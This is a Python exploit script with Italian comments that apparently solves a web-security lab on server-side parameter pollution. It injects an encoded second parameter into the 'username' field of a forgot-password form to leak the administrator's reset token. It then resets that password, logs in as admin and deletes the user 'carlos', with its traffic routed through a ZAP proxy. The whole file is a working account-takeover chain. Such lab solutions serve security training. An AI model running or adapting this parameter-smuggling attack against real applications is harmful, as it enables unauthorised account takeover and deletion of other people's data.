import re
import sys
import json
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup
import urllib3

# Disabilita i warning sui certificati non verificati (HTTPS via ZAP)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==========================
# CONFIGURAZIONE DI BASE
# ==========================

NEW_ADMIN_PASSWORD = "peter"

# Proxy di ZAP (default: 127.0.0.1:8080)
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


# ==========================
# FUNZIONI DI SUPPORTO
# ==========================

def get_session():
    """
    Crea una sessione HTTP che:
    - passa attraverso ZAP (proxy)
    - ignora la verifica del certificato (verify=False)
    """
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.verify = False
    return s


def get_csrf(html):
    """
    Estrae il token CSRF da una pagina HTML.
    Cerca un <input name="csrf" value="..."> e ritorna il value.
    """
    soup = BeautifulSoup(html, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if token_input and token_input.has_attr("value"):
        return token_input["value"]
    return None


def extract_reset_token(response_text):
    """
    Estrae il reset token dalla risposta del server.

    1. Prova a interpretare la risposta come JSON del tipo:
       {"result":"<token>","type":"reset_token"}
    2. Se non è JSON o non è nel formato atteso, ripiega su alcune regex.
    """

    # 1) Tentativo JSON pulito
    try:
        data = json.loads(response_text)
        if isinstance(data, dict) and data.get("type") == "reset_token":
            token = data.get("result")
            if token:
                return token
    except ValueError:
        # Non è JSON valido, passiamo alle regex
        pass

    # 2) Fallback regex per altri formati (HTML/testo)
    patterns = [
        r"reset token is:\s*([0-9a-zA-Z]+)",
        r'"result"\s*:\s*"([0-9a-zA-Z]+)"\s*,\s*"type"\s*:\s*"reset_token"',
    ]

    for pattern in patterns:
        m = re.search(pattern, response_text, re.IGNORECASE)
        if m:
            return m.group(1)

    raise RuntimeError("Impossibile estrarre il reset token dalla risposta del server.")


def check_lab_solved(html):
    """
    Controlla se nel body HTML compare la scritta tipica dei lab risolti.
    """
    return "Congratulations, you solved the lab" in html


# ==========================
# FASI DELL'EXPLOIT
# ==========================

def get_admin_reset_token(session: requests.Session, lab_url) -> str:
    """
    1. GET /forgot-password -> prendo il CSRF
    2. POST /forgot-password (legit) con username=administrator
       -> genera il reset token per admin
    3. GET /forgot-password -> nuovo CSRF
    4. POST /forgot-password con SSPP su 'username':
       username=administrator%26field=reset_token%23
    5. Estraggo il reset token dalla risposta
    """
    forgot_url = urljoin(lab_url, "/forgot-password")

    # 1) GET iniziale per avere il CSRF
    r = session.get(forgot_url)
    if r.status_code != 200:
        raise RuntimeError(f"GET /forgot-password (iniziale) fallita, status {r.status_code}")

    csrf = get_csrf(r.text)
    if not csrf:
        raise RuntimeError("Token CSRF non trovato nella pagina /forgot-password (iniziale)")

    # 2) POST "legit" per triggerare la generazione del reset token
    legit_data = {
        "csrf": csrf,
        "username": "administrator",
    }
    r = session.post(forgot_url, data=legit_data)
    if r.status_code != 200:
        raise RuntimeError(f"POST /forgot-password (legit) fallita, status {r.status_code}")

    # 3) Nuovo GET per avere un CSRF fresco
    r = session.get(forgot_url)
    if r.status_code != 200:
        raise RuntimeError(f"GET /forgot-password (per SSPP) fallita, status {r.status_code}")

    csrf = get_csrf(r.text)
    if not csrf:
        raise RuntimeError("Token CSRF non trovato nella pagina /forgot-password (per SSPP)")

    # 4) POST con server-side parameter pollution per leggere il reset_token
    polluted_body = f"csrf={csrf}&username=administrator%26field=reset_token%23"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    r = session.post(forgot_url, data=polluted_body, headers=headers)
    if r.status_code != 200:
        print("[DEBUG] Status:", r.status_code)
        print("[DEBUG] Body:\n", r.text)
        raise RuntimeError(f"POST /forgot-password (SSPP) fallita, status {r.status_code}")

    # 5) Estraiamo il reset token dalla risposta
    reset_token = extract_reset_token(r.text)
    print(f"[+] Reset token admin trovato: {reset_token}")
    return reset_token

def reset_admin_password(session: requests.Session, lab_url, reset_token: str, new_password: str):
    """
    1. GET /forgot-password?reset_token=<token> -> pagina di reset (CSRF)
    2. POST /forgot-password?reset_token=<token> con:
       - csrf
       - reset_token
       - new-password-1
       - new-password-2

    Cambia la password di 'administrator'.
    """
    reset_url = urljoin(lab_url, f"/forgot-password?reset_token={reset_token}")

    # 1) GET per ottenere il form e il CSRF
    r = session.get(reset_url)
    if r.status_code != 200:
        raise RuntimeError(f"GET {reset_url} fallita, status {r.status_code}")

    # prendiamo solo il csrf dall'HTML
    csrf = get_csrf(r.text)
    if not csrf:
        raise RuntimeError("Token CSRF non trovato nella pagina di reset password")

    # 2) POST per impostare nuova password
    # vogliamo replicare esattamente:
    # csrf=...&reset_token=...&new-password-1=...&new-password-2=...
    data = {
        "csrf": csrf,
        "reset_token": reset_token,
        "new-password-1": new_password,
        "new-password-2": new_password,
    }

    r = session.post(reset_url, data=data)
    # in ZAP hai visto un 302 con Location: /, quindi è normale che non sia 200,
    # ma requests di default segue i redirect, quindi qui spesso vedrai già 200.
    if r.status_code not in (200, 302):
        print("[DEBUG] Reset password status:", r.status_code)
        print("[DEBUG] Body:\n", r.text[:500])
        raise RuntimeError(f"POST {reset_url} fallita, status {r.status_code}")

    print("[+] Password di 'administrator' cambiata con successo.")

def login_as_admin(session: requests.Session, lab_url, password: str):
    """
    1. GET /login -> prendo il CSRF
    2. POST /login con username=administrator e la nuova password
    """
    login_url = urljoin(lab_url, "/login")

    # 1) GET per il form di login
    r = session.get(login_url)
    if r.status_code != 200:
        raise RuntimeError(f"GET /login fallita, status {r.status_code}")

    csrf = get_csrf(r.text)
    if not csrf:
        raise RuntimeError("Token CSRF non trovato nella pagina /login")

    # 2) POST con credenziali admin
    data = {
        "csrf": csrf,
        "username": "administrator",
        "password": password,
    }
    r = session.post(login_url, data=data)
    if r.status_code != 200:
        raise RuntimeError(f"POST /login fallita, status {r.status_code}")

    if "Log out" in r.text or "Admin panel" in r.text:
        print("[+] Login come 'administrator' riuscito.")
    else:
        print("[!] Login come 'administrator' potrebbe NON essere riuscito, controlla la risposta.")


def delete_carlos(session: requests.Session, lab_url):
    """
    1. GET /admin per verificare che siamo admin
    2. GET /admin/delete?username=carlos per eliminare l'utente
    """
    admin_url = urljoin(lab_url, "/admin")
    r = session.get(admin_url)
    if r.status_code != 200:
        raise RuntimeError(f"GET /admin fallita, status {r.status_code}")

    if "carlos" not in r.text:
        print("[!] Non vedo 'carlos' nella pagina admin, controlla l'HTML.")

    # Endpoint reale osservato: GET /admin/delete?username=carlos
    delete_url = urljoin(lab_url, "/admin/delete")
    params = {"username": "carlos"}

    r = session.get(delete_url, params=params)
    if r.status_code != 200:
        raise RuntimeError(f"GET /admin/delete fallita, status {r.status_code}")

    if check_lab_solved(r.text):
        print("[+] Utente 'carlos' eliminato. Lab risolto! 🎉")
    else:
        print("[!] Richiesta di delete inviata, ma non ho trovato il messaggio di lab risolto.")


# ==========================
# MAIN
# ==========================

def main(lab_url):

    lab_url=lab_url.rstrip('/')
    session = get_session()

    print(f"[*] Target: {lab_url}\n")
    print("[*] Avvio exploit sul lab SSPP (query string)...")

    # 1) Ottenere il reset token di administrator tramite SSPP
    reset_token = get_admin_reset_token(session,lab_url)

    # 2) Cambiare la password di administrator usando il reset token
    reset_admin_password(session, lab_url, reset_token, NEW_ADMIN_PASSWORD)

    # 3) Loggarsi come administrator con la nuova password
    login_as_admin(session,lab_url, NEW_ADMIN_PASSWORD)

    # 4) Eliminare l'utente carlos dall'admin panel
    delete_carlos(session,lab_url)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <LAB_URL>")
        sys.exit(1)
    main(sys.argv[1])
